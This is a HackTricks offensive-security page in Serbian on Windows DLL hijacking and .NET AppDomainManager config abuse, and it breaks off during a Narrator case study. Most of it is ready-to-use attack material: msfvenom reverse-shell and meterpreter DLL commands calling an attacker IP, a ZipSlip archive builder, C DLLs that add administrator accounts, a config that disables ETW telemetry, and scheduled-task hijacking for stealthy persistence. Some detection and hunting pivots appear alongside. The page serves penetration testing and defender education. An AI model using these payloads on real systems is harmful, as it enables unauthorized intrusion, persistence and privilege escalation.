# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulisanje pouzdanom aplikacijom kako bi učitala zlonamerni DLL. Ovaj termin obuhvata nekoliko taktika, kao što su **DLL Spoofing, Injection i Side-Loading**. Uglavnom se koristi za izvršavanje koda, ostvarivanje persistence i, ređe, privilege escalation. Iako je ovde fokus na escalation-u, metoda hijacking-a ostaje ista bez obzira na cilj.

### Uobičajene tehnike

Za DLL hijacking se koristi nekoliko metoda, a njihova efikasnost zavisi od strategije aplikacije za učitavanje DLL-ova:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zamena legitimnog DLL-a zlonamernim, uz opciono korišćenje DLL Proxying-a radi očuvanja funkcionalnosti originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u search path ispred legitimnog, čime se iskorišćava obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a koji će aplikacija učitati, verujući da je reč o nepostojećem, ali neophodnom DLL-u.
4. **DLL Redirection**: Izmena search parametara kao što su `%PATH%` ili `.exe.manifest` / `.exe.local` fajlovi, kako bi se aplikacija usmerila ka zlonamernom DLL-u.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernom verzijom u WinSxS direktorijumu, što je metoda često povezana sa DLL side-loading-om.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum pod kontrolom korisnika zajedno sa kopiranom aplikacijom, što podseća na Binary Proxy Execution tehnike.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasični DLL sideloading nije jedini način da se pouzdani **.NET Framework** proces natera da učita attacker code. Ako je ciljni executable **managed** aplikacija, CLR takođe proverava application configuration file imenovan prema executable-u (na primer `Setup.exe.config`). Taj fajl može definisati prilagođeni **AppDomainManager**. Ako konfiguracija pokazuje na assembly pod kontrolom napadača koji se nalazi pored EXE fajla, CLR ga učitava **pre normalnog code path-a aplikacije** i izvršava unutar pouzdanog procesa.<sup>[[24]](#references)</sup>

Prema Microsoft-ovoj .NET Framework configuration schema-i, i `<appDomainManagerAssembly>` i `<appDomainManagerType>` moraju biti prisutni da bi se koristio prilagođeni manager.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracija:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimalni menadžer:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktične napomene:
- Ovo je tradecraft specifičan za **.NET Framework**. Oslanja se na parsiranje CLR konfiguracije, a ne na Win32 redosled pretrage DLL-ova.
- Host mora zaista biti **managed EXE**. Brza provera: `sigcheck -m target.exe`, `corflags target.exe` ili provera **CLR Runtime Header** u PE metapodacima.
- Naziv config fajla mora tačno odgovarati nazivu izvršne datoteke (`<binary>.config`) i obično se nalazi **pored EXE fajla**.
- Ovo je korisno sa **signed Microsoft/vendor binaries** zato što trusted EXE ostaje netaknut, dok se malicious managed assembly izvršava unutar procesa.
- Ako već imate writable installer/update direktorijum, AppDomainManager hijacking može se koristiti kao **first stage**, nakon čega slede klasični DLL sideloading ili reflective loading za naredne stage-ove.

### AppDomainManager kao downloader + scheduled-task bootstrap

Praktičan intrusion pattern je uparivanje trusted managed EXE fajla sa malicious `*.config` fajlom i malicious AppDomainManager DLL fajlom koji služi samo kao **mali bootstrapper**:<sup>[[25]](#references)</sup>

1. User pokreće signed .NET installer ili updater iz uverljive lokacije, kao što je `%USERPROFILE%\Downloads`.
2. Pridruženi config navodi CLR da učita attacker assembly **pre** nego što legitimna logika aplikacije počne sa radom.
3. Malicious manager izvršava **path gate** (na primer, nastavlja samo ako host EXE radi iz `Downloads` direktorijuma i dozvoljava da second stage radi samo iz `%LOCALAPPDATA%`).
4. Ako provera prođe, preuzima real payload u user-writable putanju, kao što je `%LOCALAPPDATA%\PerfWatson2.exe`, i uspostavlja persistence pomoću scheduled task-a.

Zašto je ova varijanta važna:
- Signed host EXE ostaje nepromenjen, pa triage koji proverava samo hash glavnog binary fajla može propustiti compromise.
- Jednostavan **path-based anti-analysis** je čest: premeštanje ZIP/EXE/DLL triade na Desktop, Temp ili sandbox putanju može namerno prekinuti chain.
- First-stage AppDomainManager DLL može ostati veoma mali i sa malo noise-a, dok se pravi implant preuzima kasnije.

Minimalni persistence primer koji se često viđa sa ovim pattern-om:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Napomene:
- ` /rl highest` znači **najviši dostupni nivo** za tog korisnika/sesiju; sam po sebi ne predstavlja garantovanu SYSTEM eskalaciju.
- Ova tehnika se često preciznije kategorizuje kao **execution/persistence via .NET config abuse**, a ne kao klasični missing-DLL search-order hijacking, iako operatori često kombinuju obe tehnike.

Pivoti za detekciju:
- Potpisani .NET izvršni fajlovi pokrenuti iz **ZIP extraction paths**, `Downloads`, `%TEMP%` ili drugih foldera u koje korisnik može da upisuje, sa **colocated** `<exe>.config` fajlom.
- Novi scheduled tasks čija akcija pokazuje na `%LOCALAPPDATA%`, `%APPDATA%` ili `Downloads`, a čiji nazivi oponašaju browser/vendor updatere.
- Kratkotrajni managed bootstrap procesi koji odmah preuzimaju drugi EXE, a zatim pokreću `schtasks.exe`.
- Uzorci koji se rano prekidaju osim ako putanja do izvršnog fajla odgovara očekivanom user-profile direktorijumu.

### Preuzimanje postojećeg scheduled task-a radi ponovnog pokretanja sideload lanca

Radi persistence-a, nemojte tražiti samo **kreiranje novog task-a**. Neke intrusion sets čekaju da legitimni installer kreira **normalan updater task**, a zatim prepisuju task action tako da postojeći naziv, autor i trigger ostanu poznati defenderima.

Ponovljivi workflow:
1. Instalirajte/pokrenite legitimni software i identifikujte task koji on obično kreira.
2. Eksportujte task XML i zabeležite trenutne vrednosti `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zamenite samo action tako da task pokrene vaš **trusted host EXE** iz staging direktorijuma u koji korisnik može da upisuje; taj EXE zatim radi side-load ili AppDomain-load stvarnog payload-a.
4. Ponovo registrujte isti naziv task-a umesto kreiranja novog očiglednog persistence artefakta.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Zašto je stealthier:
- Naziv taska i dalje može izgledati legitimno (na primer vendor updater).
- **Task Scheduler service** ga pokreće, pa validacija parent/ancestor procesa često vidi očekivani scheduling chain umesto `explorer.exe`.
- DFIR timovi koji traže samo **nove nazive taskova** mogu propustiti task čija je registracija već postojala, ali čija akcija sada pokazuje na `%LOCALAPPDATA%`, `%APPDATA%` ili drugu putanju pod kontrolom napadača.

Brzi hunting pivoti:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Uporedite XML datoteke `C:\Windows\System32\Tasks\*` i metadata iz `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` sa baseline-om.
- Postavite alert kada **vendor-looking updater task** izvršava fajl iz **user-writable directories** ili pokreće .NET EXE sa pripadajućim `*.config` fajlom.

> [!TIP]
> Za chain korak-po-korak koji kombinuje HTML staging, AES-CTR configs i .NET implants sa DLL sideloading-om, pogledajte workflow u nastavku.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Pronalaženje nedostajućih DLL-ova

Najčešći način za pronalaženje nedostajućih DLL-ova unutar sistema jeste pokretanje alata [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals paketa, uz **podešavanje** **sledeća 2 filtera**:

![Common Techniques - Pronalaženje nedostajućih DLL-ova: Najčešći način za pronalaženje nedostajućih DLL-ova unutar sistema jeste pokretanje procmon alata iz sysinternals paketa, uz podešavanje sledeća 2 filtera](<../../../images/image (961).png>)

![Common Techniques - Pronalaženje nedostajućih DLL-ova: Najčešći način za pronalaženje nedostajućih DLL-ova unutar sistema jeste pokretanje procmon alata iz sysinternals paketa, uz podešavanje sledeća 2 filtera](<../../../images/image (230).png>)

i prikažite samo **File System Activity**:

![Common Techniques - Pronalaženje nedostajućih DLL-ova: i prikažite samo File System Activity](<../../../images/image (153).png>)

Ako tražite **nedostajuće DLL-ove uopšteno**, ostavite ovo da radi nekoliko **sekundi**.\
Ako tražite **nedostajući DLL unutar konkretnog executable-a**, postavite dodatni filter, kao što je **"Process Name" "contains" `<exec name>`**, pokrenite ga i zaustavite hvatanje događaja.<sup>[[9]](#references)</sup>

## Exploiting Missing DLLs

Za escalation privilegija potražite **DLL koji privilegovani proces pokušava da učita** sa lokacije u koju možete da upisujete. To se može dogoditi kada kontrolišete direktorijum koji se pretražuje pre direktorijuma koji sadrži legitimni DLL, ili kada zahtevani DLL ne postoji, a možete da upisujete u jedan od pretraživanih direktorijuma.

### Dll Search Order

**U** [**Microsoft dokumentaciji**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći kako se DLL-ovi konkretno učitavaju.**

**Windows aplikacije** traže DLL-ove prateći skup **unapred definisanih search path-ova**, pridržavajući se određenog redosleda. Problem DLL hijacking-a nastaje kada se malicious DLL strateški postavi u jedan od tih direktorijuma, čime se obezbeđuje da bude učitan pre autentičnog DLL-a. Rešenje za sprečavanje ovoga jeste da aplikacija koristi apsolutne putanje kada upućuje na DLL-ove koji su joj potrebni.

Redosled **DLL search-a na 32-bitnim** sistemima možete videti u nastavku:

1. Direktorijum iz kog je aplikacija učitana.
2. System direktorijum. Koristite funkciju [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) da biste dobili putanju ovog direktorijuma.(_C:\Windows\System32_)
3. 16-bitni system direktorijum. Ne postoji funkcija koja dobija putanju ovog direktorijuma, ali se on pretražuje. (_C:\Windows\System_)
4. Windows direktorijum. Koristite funkciju [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) da biste dobili putanju ovog direktorijuma.
1. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi navedeni u PATH environment variable-u. Imajte na umu da ovo ne uključuje per-application putanju navedenu registry ključem **App Paths**. Ključ **App Paths** se ne koristi pri izračunavanju DLL search path-a.

To je podrazumevani redosled pretrage sa uključenim **SafeDllSearchMode**. Kada je on onemogućen, trenutni direktorijum se pomera na drugo mesto. Da biste onemogućili ovu funkciju, kreirajte registry vrednost **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je uključena).

Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu executable module-a koji **LoadLibraryEx** učitava.

Konačno, DLL se može učitati apsolutnom putanjom umesto nazivom. U tom slučaju Windows traži sam DLL samo na toj putanji; dependencies zahtevane po nazivu i dalje prate odgovarajući search order.

Postoje i drugi načini za izmenu search order-a, ali ih ovde neću objašnjavati.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Koristite **ProcMon** filtere (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) da biste prikupili nazive DLL-ova koje proces proverava, ali ne može da pronađe.<sup>[[14]](#references)</sup>
2. Ako se binary pokreće putem **schedule-a/service-a**, DLL sa jednim od tih naziva postavljen u **application directory** (search-order entry #1) biće učitan pri sledećem izvršavanju. U jednom .NET scanner slučaju proces je tražio `hostfxr.dll` u `C:\samples\app\` pre učitavanja prave kopije iz `C:\Program Files\dotnet\fxr\...`.
3. Napravite payload DLL (npr. reverse shell) sa bilo kojim export-om: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ako je vaš primitive **ZipSlip-style arbitrary write**, napravite ZIP čiji entry izlazi iz extraction direktorijuma tako da DLL završi u app folderu:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostavite arhivu u nadzirani inbox/share; kada scheduled task ponovo pokrene proces, on učitava maliciozni DLL i izvršava vaš kod u kontekstu servisnog naloga.

### Prinudni sideloading putem RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način za deterministički uticaj na DLL search path novokreiranog procesa jeste postavljanje polja DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa pomoću ntdll native API-ja. Ako se ovde navede direktorijum pod kontrolom napadača, ciljani proces koji razrešava importovani DLL po imenu (bez apsolutne putanje i bez korišćenja safe loading flags) može biti primoran da učita maliciozni DLL iz tog direktorijuma.

Ključna ideja
- Izgradite parametre procesa pomoću RtlCreateProcessParametersEx i navedite prilagođeni DllPath koji pokazuje na vaš kontrolisani folder (npr. direktorijum u kom se nalaze vaš dropper/unpacker).
- Kreirajte proces pomoću RtlCreateUserProcess. Kada ciljani binar razrešava DLL po imenu, loader će tokom razrešavanja proveriti navedeni DllPath, čime se omogućava pouzdan sideloading čak i kada se maliciozni DLL ne nalazi u istom direktorijumu kao ciljani EXE.

Napomene/ograničenja
- Ovo utiče na child process koji se kreira; razlikuje se od SetDllDirectory, koji utiče samo na trenutni proces.
- Ciljani proces mora da importuje DLL ili da pozove LoadLibrary za DLL po imenu (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodovane apsolutne putanje ne mogu se hijack-ovati. Forwarded exports i SxS mogu promeniti redosled prioriteta.

Minimalni C primer (ntdll, wide strings, pojednostavljeno rukovanje greškama):

<details>
<summary>Kompletan C primer: prinudni DLL sideloading putem RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Primer operativne upotrebe
- Postavite zlonamerni xmllite.dll (koji eksportuje zahtevane funkcije ili prosleđuje pozive stvarnom DLL-u) u vaš DllPath direktorijum.
- Pokrenite potpisani binary za koji je poznato da pretražuje xmllite.dll po imenu koristeći prethodno opisanu tehniku. Loader rešava import preko prosleđenog DllPath-a i učitava vaš DLL kroz sideloading.

Ova tehnika je primećena u stvarnim napadima za pokretanje višestepenih sideloading lanaca: početni launcher ispušta pomoćni DLL, koji zatim pokreće Microsoft-potpisani binary podložan hijacking-u sa prilagođenim DllPath-om, kako bi primorao učitavanje napadačevog DLL-a iz staging direktorijuma.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

Za ciljeve zasnovane na **.NET Framework-u**, sideloading se može izvršiti **pre `Main()`** bez patchovanja memorije, zloupotrebom susednog **`.exe.config`** fajla aplikacije. Umesto oslanjanja isključivo na redosled pretrage Win32 DLL-ova, napadač postavlja legitimni .NET EXE pored zlonamernog config fajla i jednog ili više sklopova pod kontrolom napadača.

Kako lanac funkcioniše:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE se pokreće, a **CLR čita `<exe>.config`**.
2. Config postavlja **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`**, tako da runtime instancira `AppDomainManager` pod kontrolom napadača.
3. Zlonamerni manager dobija izvršavanje **pre `Main()`** unutar procesa pouzdanog hosta.
4. Isti config može primorati CLR da prvo razrešava lokalne sklopove (na primer `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) i može oslabiti runtime validaciju/telemetriju bez inline patchovanja.

Obrazac u stilu kampanje (tačno ugnježđavanje može da varira u zavisnosti od direktive / verzije CLR-a):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Zašto je ovo korisno:
- **`<probing privatePath="."/>`** održava razrešavanje assembly-ja u direktorijumu aplikacije, pretvarajući folder u predvidljivu površinu za sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** preusmeravaju izvršavanje u kod napadača tokom CLR inicijalizacije, pre nego što se pokrene legitimna logika aplikacije.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** može omogućiti full-trust aplikaciji da učita unsigned ili izmenjene assembly-je bez greške pri strong-name validaciji.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** izbegava publisher-policy preusmeravanja ka novijim assembly-jima.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** čini izbor runtime-a determinističkijim.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** je posebno zanimljiv zato što **CLR onemogućava sopstvenu ETW vidljivost** iz konfiguracije, umesto da implant u memoriji menja `EtwEventWrite`.

Operativni obrazac uočen u novijim kampanjama:
- Faza 1 postavlja `setup.exe`, `setup.exe.config` i lokalne assembly-je.
- Faza 2 ih kopira u uverljiv **AppData update** folder, preimenuje host u nešto poput `update.exe` i ponovo ga pokreće pomoću **scheduled task-a**.
- Faza 3 proverava kontekst izvršavanja (na primer očekivani roditelj `svchost.exe` iz Task Scheduler-a) pre učitavanja konačnog RAT DLL/export-a.

Ideje za hunting:
- Potpisani ili na drugi način legitimni **.NET izvršni fajlovi** koji se pokreću sa sumnjivim susednim **`.config`** fajlovima na lokacijama u koje korisnik može da upisuje.
- `.config` fajlovi koji sadrže **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ili **`etwEnable enabled="false"`**.
- Scheduled tasks koji ponovo pokreću preimenovane update binarne fajlove iz **`%LOCALAPPDATA%`** ili direktorijuma specifičnih za aplikaciju, kao što je `\bin\update\`.
- Lanci roditelj/dete u kojima scheduled task pokreće pouzdani .NET host koji odmah učitava assembly-je koji nisu od dobavljača iz sopstvenog direktorijuma.

#### Izuzeci u redosledu pretrage dll fajlova prema Windows dokumentaciji

Određeni izuzeci od standardnog redosleda pretrage DLL fajlova navedeni su u Windows dokumentaciji:

- Kada se naiđe na **DLL koji ima isto ime kao DLL koji je već učitan u memoriji**, sistem zaobilazi uobičajenu pretragu. Umesto toga, proverava redirekciju i manifest, a zatim kao podrazumevanu opciju koristi DLL koji je već u memoriji. **U ovom scenariju sistem ne vrši pretragu DLL fajla**.
- U slučajevima kada je DLL prepoznat kao **known DLL** za aktuelnu verziju Windows-a, sistem će koristiti svoju verziju known DLL-a, zajedno sa svim njegovim zavisnim DLL fajlovima, **preskačući proces pretrage**. Registry ključ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih known DLL fajlova.
- Ako **DLL ima zavisnosti**, pretraga tih zavisnih DLL fajlova obavlja se kao da su navedeni samo svojim **module names**, bez obzira na to da li je početni DLL identifikovan pomoću pune putanje.

### Eskalacija privilegija

**Zahtevi**:

- Identifikujte proces koji radi ili će raditi sa **drugačijim privilegijama** (horizontalno ili lateralno kretanje), a kojem **nedostaje DLL**.
- Uverite se da je dostupan **pristup upisivanju** u bilo koji **direktorijum** u kojem će se vršiti **pretraga DLL-a**. To može biti direktorijum izvršnog fajla ili direktorijum unutar sistemske putanje.

Ovi preduslovi podrazumevano nisu uobičajeni: privilegovanim izvršnim fajlovima obično ne nedostaju zavisnosti DLL-a, a standardni korisnici najčešće ne mogu da upisuju u direktorijume sistemskih putanja za pretragu. Pogrešno konfigurisana okruženja ipak mogu izložiti oba uslova.\
Ako su zahtevi ispunjeni, proverite projekat [UACME](https://github.com/hfiref0x/UACME). Iako mu je glavni cilj UAC bypass, sadrži DLL-hijacking PoC-ove za određene verzije Windows-a koji se često mogu prilagoditi direktorijumu sa mogućnošću upisivanja koji ste pronašli.

Imajte na umu da možete **proveriti svoje dozvole u folderu** pomoću:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole svih fascikli unutar PATH-a**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti importe izvršne datoteke i exporte DLL-a pomoću:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za kompletan vodič o tome kako **zloupotrebiti DLL Hijacking za eskalaciju privilegija** sa dozvolama za upis u fasciklu **System Path** pogledajte:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate dozvole za upis u bilo koju fasciklu unutar system PATH-a.\
Drugi zanimljivi automated tools za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Example

Ako pronađete scenario koji može da se iskoristi, jedna od najvažnijih stvari za uspešno iskorišćavanje bila bi da **kreirate dll koji eksportuje barem sve funkcije koje će executable uvesti iz njega**. U svakom slučaju, imajte na umu da je DLL Hijacking koristan za [eskalaciju sa nivoa Medium Integrity na High **(zaobilaženjem UAC-a)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili sa nivoa[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)**.** Primer **kako kreirati validan dll** možete pronaći u ovoj studiji o DLL hijacking-u, fokusiranoj na DLL hijacking za izvršavanje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Pored toga, u **sledećoj sekciji** možete pronaći neke **osnovne dll kodove** koji mogu biti korisni kao **šabloni** ili za kreiranje **dll-a sa eksportovanim funkcijama koje nisu neophodne**.

## **Kreiranje i kompajliranje DLL-ova**

### **DLL Proxifying**

U osnovi, **DLL proxy** je DLL sposoban da **izvrši vaš malicious code kada se učita**, ali i da ga **izloži** i **funkcioniše** onako kako se **očekuje**, tako što **prosleđuje sve pozive stvarnoj biblioteci**.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **navesti executable i izabrati biblioteku** koju želite da proxify-ujete i **generisati proxified dll**, ili **navesti DLL** i **generisati proxified dll**.

### **Meterpreter**

**Dobijanje rev shell-a (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Nabavite meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreiranje korisnika (x86, nisam pronašao x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Vaša sopstvena

U mnogim slučajevima, DLL koji kompajlirate mora da **exportuje svaku funkciju koju victim process importuje**. Ako nedostaje neki zahtevani export, binary ne može da ga razreši i exploit neće uspeti.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativni C DLL sa ulaznom tačkom niti</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe i dalje pri pokretanju proverava predvidljivi DLL za lokalizaciju specifičan za jezik, koji može biti hijacked za izvršavanje proizvoljnog koda i persistence.<sup>[[7]](#references)</sup>

Ključne činjenice
- Probe path (trenutne verzije): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (starije verzije): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
